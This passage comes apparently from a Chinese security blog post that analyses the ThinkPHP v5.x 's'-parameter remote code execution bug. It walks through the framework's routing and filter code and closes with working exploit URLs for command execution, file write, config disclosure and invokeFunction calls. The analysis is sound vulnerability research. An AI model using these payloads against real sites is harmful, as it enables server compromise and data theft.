class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 闭包调用</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。<br>最终的调用函数为Request::filterValue函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);<span class="comment">//调用函数</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">                <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。<br>v5.0版本中poc都能用</p>
+<p>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code><br>除此之外，还可以使用\think\request/input（v5.0版本不能用是因为think\request的构造函数为protected，不允许动态调用）<br>如任意代码执行<br><code>?s=index/\think\request/input&amp;data[]=123&amp;filter=phpinfo</code><br>invokeFunction核心ReflectionFunction<br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</code><br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br>因为think\app继承自think\container，所以改成think\app也行<br>其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数<br>call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）<br>这里v5.1只能用php7，如v5.0还可以使用assert来执行函数</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。<br>其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞</p>
+
+  	</div>
+	  
+	  <div class="article-tags tags">
+      
+        <a href="/tags/cms/">cms</a>
+      
+	  </div>
+    
+
+	
+		<div class="art-item-footer">
+				
+					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prev：<a href="/2019/02/21/php安全/temmoku-t1-15-sqli/" rel="prev"  title="【Code Review】temmoku home版 t1.15 前台sqli">
+						【Code Review】temmoku home版 t1.15 前台sqli
+					</a></span>
+				
+				
+					<span class="art-item-right">next：<a href="/2018/05/28/ctf/suctf-part-web-writeup/" rel="next"  title="【CTF】SUCTF 2018 部分web writeup">
+						【CTF】SUCTF 2018 部分web writeup
+					</a><i class="icon icon-chevron-thin-right"></i></span>
+				
+		</div>
+	
+	</section>
+	
+		<section id="comments">
+			<div id="disqus_thread"></div>
+		</section>
+	
+</article>
+<script>
+	window.subData = {
+		title: '【Code Analysis】thinkphp v5.x App.php s参数RCE',
+		tools: true
+	}
+</script>
+
+      </div>
+      <aside class='l_side'>
+        
+  <section class='m_widget about'>
+
+<div class='header'>wh1t3p1g</div>
+<div class='content'>
+<div class='desc'>A Web 🐶 &amp;&amp; Code Reviewer</div>
+</div>
+</section>
+
+  <section class='m_widget links'>
+<div class='header'>Links</div>
+<div class='content'>
+    <ul class="entry">
+    
+        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
+            <div class='name'>orleven</div>
+        </a></li>
+    
+        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
+            <div class='name'>warmeng</div>
+        </a></li>
+    
+    </ul>
+</div>
+</section>
+
+  <section class='m_widget categories'>
+<div class='header'>Categories</div>
+<div class='content'>
+    
+    <ul class="entry">
+    
+        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
+    
+        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>5</div></a></li>
+    
+        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>23</div></a></li>
+    
+        <li><a class="flat-box" href="/categories/notes-codereview-ctf/"><div class='name'>notes|codereview|ctf</div><div class='badget'>1</div></a></li>
+    
+    </ul>
+    
+</div>
+</section>
+
+  
+<div class="m_widget tagcloud">
+    <div class="header">Tags</div>
+    <div class='content'>
+        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18px; color: #2b2b2b">cms</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a> <a href="/tags/xxxctf-cms-vul-others-cve/" style="font-size: 14px; color: #808080">xxxctf|cms|vul|others|cve</a>
+    </div>
+</div>
+
+
+
+      </aside>
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+  </div>
+  <footer id="footer" class="clearfix">
+
+	<div class="social-wrapper">
+  	
+      
+        <a href="https://github.com/wh1t3p1g" class="social github"
+          target="_blank" rel="external">
+          <span class="icon icon-github"></span>
+        </a>
+      
+        <a href="/atom.xml" class="social rss"
+          target="_blank" rel="external">
+          <span class="icon icon-rss"></span>
+        </a>
+      
+    
+  </div>
+  
+  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
+  
+</footer>
+
+
+  <script>setLoadingBarProgress(80);</script>
+  
+<script>
+  var disqus_shortname = '0kami';
+  
+  var disqus_url = 'http://blog.0kami.cn/2019/02/05/php安全-thinkphp-v5-x-App-php-rce/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
+<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
+<script src="/js/jquery.fitvids.js"></script>
+<script>
+	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+	var ALGOLIA_API_KEY = "";
+	var ALGOLIA_APP_ID = "";
+	var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "hexo";
+  var ROOT = "/"||"/";
+  if(!ROOT.endsWith('/'))ROOT += '/';
+</script>
+<script src="/js/search.js"></script>
+<script src="/js/app.js"></script>
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
